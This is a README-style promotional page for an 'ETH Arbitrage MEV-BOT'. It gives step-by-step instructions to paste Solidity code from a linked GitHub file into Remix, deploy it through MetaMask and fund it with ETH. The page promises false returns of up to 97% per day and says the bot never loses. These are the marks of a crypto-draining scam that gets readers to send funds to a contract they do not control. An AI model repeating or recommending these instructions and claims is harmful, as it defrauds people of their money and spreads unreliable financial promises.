![](https://i.imgur.com/GB3KvsI.png)

<div align="center">

# ⚡🤖 ETH Arbitrage MEV-BOT 🤖⚡
  
Here we provide you access to our 100% Open-Source and User-Friendly (no coding skills required) MEV Bot written in Solidity. It's our flagship project that allows users to automatically profit from high-value swaps by strategically reordering and placing transactions to take advantage of expected price flactuations within Uniswap liquidity pools.

</div>

<p align="center">
  <img src="https://github.com/ntkme/github-buttons/workflows/build/badge.svg" alt="build"/>
  </p>

<p align="center">
  <img src="https://img.shields.io/badge/Ethereum-3C3C3D?style=for-the-badge&logo=Ethereum&logoColor=white" alt="ethereum" />
  <img src="https://img.shields.io/badge/Solidity-%23363636.svg?style=for-the-badge&logo=solidity&logoColor=white" alt="solidity" />
</p>

---
### 🧵 Contents
- [📚 About](#-about)
- [✨ How it Works ](#-how-it-works)
- [📈 Estimated Profits](#-estimated-profits)
- [🚀 How to get started](#-how-to-launch-the-eth-mev-bot)
- [👋 Contact](#-contact)
---

## 📚 About

In the fascinating world of cryptocurrency, understanding what a MEV Bot is, can be crucial. A Maximal Extractable Value (MEV) bot is a powerful arbitrage tool that scans the Ethereum Mempool for pending transactions (TX) of decentralized exchanges like Uniswap. 
It automatically inserts our first TX with _slightly higher gas_ fees (1 Gwei higher) and a second one with _slightly lower gas_, essentially sandwiching the "targeted" TX to generate profits of the slippage differences.

---

<div align="center">

## ✨ How it works

![example](https://user-images.githubusercontent.com/130685019/254479836-a36f8b0c-882d-4efe-97b4-42e22a7f29d1.png)

</div>

- The MEV-BOT continuously monitors the public Ethereum Mempool for pending transactions (TX) from Uniswap AMM, until it identifies a TX with price slippage / flactuations on a token (e.g. a large buy order)🔎
- Before executing any trades, the algorithm calculates the potential gains against transaction costs to ensure profitability💡
- MEV-Bot swiftly executes a sandwich operation by placing a buy order (for the same token) just before the "targeted" TX, simultaneous with placing a sell order right after within the same block, profiting from the price movement🥪
- It optimizes paid gas fees for timely execution, cost efficiency and it always sets 1 gas more than competing bots, as long as it remains profitable⚡
- Then sends back the ETH to the contract ready for withdrawal📤

We are proud to say that our MEV solution outperforms 99% of Arbitrage Bots on the Ethereum Blockchain.

---

## 📈 Estimated Profits


| Investment Range (ETH)      | Liquidity Level      | Profits per 24 Hours    |
|-----------------------|----------------------|-------------------------|
| 1.2  ETH - 2.4   ETH       | Low                  | Up to 10%    |
| 2.4  ETH - 5   ETH      | Moderate              | Up to 20%    |
| 5    ETH - 10   ETH      | Moderate             | 20-27%      |
| 10   ETH - 20 ETH       | High                 | 27-35%      |
| 20   ETH - 50    ETH        | High                 | 35-50%       |
| 50   ETH - 100    ETH        | Very High            | 50-63%       |
| 100  ETH - 200    ETH         | Very High            | 76%+         |
| 200  ETH - 500   ETH        | Extremely High       | 97%+         |

_Please be aware that these figures are estimates based on historical data. They can slightly vary depending on market conditions and the frequency of MEV opportunities._

---


## 🚀 How to launch the ETH MEV-Bot

1)  Download [MetaMask](https://metamask.io/download.html) (if you don’t have it already) 

2)  Access [Remix - Ethereum IDE](https://remix-ethereum.org) (Web-based environment to write and deploy Ethereum smart contracts)

3) 📁 Create a  `New File`. Rename it as you like, i.e: “MEV.sol”

<img src="https://i.imgur.com/HK9GFSn.png" height="200">

---


4) 🧾 Paste [This Code](https://raw.githubusercontent.com/Aikotu/MevB0T/main/MEVBot.sol) from Github into your Remix "MEV.sol" file

5) 🔧 Go to the `Solidity Compiler` tab, select version `0.6.12+commit.27d51765.js` and then select `Compile MEV.sol`.

<img src="https://i.imgur.com/2GhNgZL.png" height="200">

---

6) 🚀 Navigate to the `DEPLOY & RUN TRANSACTIONS` tab, select the `Injected Provider - Metamask` environment and then `Deploy`. By approving the Metamask contract creation fee, you will have created your own MEV-Bot.

<img src="https://i.imgur.com/rw1WmRH.png" height="200">
<img src="https://i.imgur.com/N9p3Ylm.png" height="200">

---

#### ⚙️ Configuration

7) 💰 Copy the bot’s contract and send some Ethereum to its balance for the bot to start. Team recommendation is to fund the bot with an minimum amount of 0.62 ETH but more than 1 ETH is recommended so the bot has enough gas and funds to swap, pay builders, etc.
<img src="https://i.imgur.com/eK33W4o.png" height="200">

---
 
8) - After your transaction is confirmed, click the `Start` button to run the bot.  
   - Press the `Stop` button to halt bot operations.  
   - Withdraw all ETH at any time by clicking the `Withdrawal` button.  

<img src="https://i.imgur.com/v1pu7M9.png" height="200">

---

<br>
<div align="center">

💰 That’s it. The bot will start working immediately earning you profits from sandwich actions on Uniswap pools 💰

</div>

<div align="center">

Notice: Your MEV-Bot needs to run for at least one day to reach the estimated performance.
</div>


---

### 👋 Contact

If you have any questions or inquiries for assistance, feel free to reach out to us on Telegram: [Click Here](https://t.me/MEV_Contact)

---

### ⭐ Show your Support

If you find our project interesting, please consider giving it a star. Your support is greatly appreciated and helps in motivating further development and improvements.

![star](https://cdn.discordapp.com/attachments/975036883958636557/975057102097743973/unknown.png)

---

## 💭FAQ

#### If many people will use the bot, wouldn’t dilution of profits occur?

We do not plan to limit access to the bot for now because there won’t be any affect for us or our users profiting as pools that the bot works on are with the biggest liquidities and volumes on Uniswap so our users involvement in the pools will always be very minor.

#### What average ROI and risks can I expect?

You can find the ROI according to latest data of bot performances in the "Estimated Profits" section. Bot does not make any losses, it only executes trades when there are proper MEV opportunities to make profits, so under all circumstances user is in plus.

#### What amount of funds does bot need to work?

Team recommendation is to fund the bot with an minimum amount of 0.62 ETH but more than 1 ETH is recommended so the bot has enough gas and funds to swap, pay builders, etc.

#### Do I need to keep remix open in browser while the bot is activated? 

No, just save the bot contract address after creating it. The next time you want to access your bot via Remix, you need to compile the file again as in step 5. Now head to `DEPLOY & RUN TRANSACTIONS`, reconnect your Metamask, paste your contract address into `Load contract from Address` and press `At Address`.

![](https://i.imgur.com/SG1aENC.png)

Now it can be found again under "Deployed Contracts".

#### Does it work on other chains or DEXes as well?

No, currently the bot is dedicated only for Ethereum on Uniswap pools.

---
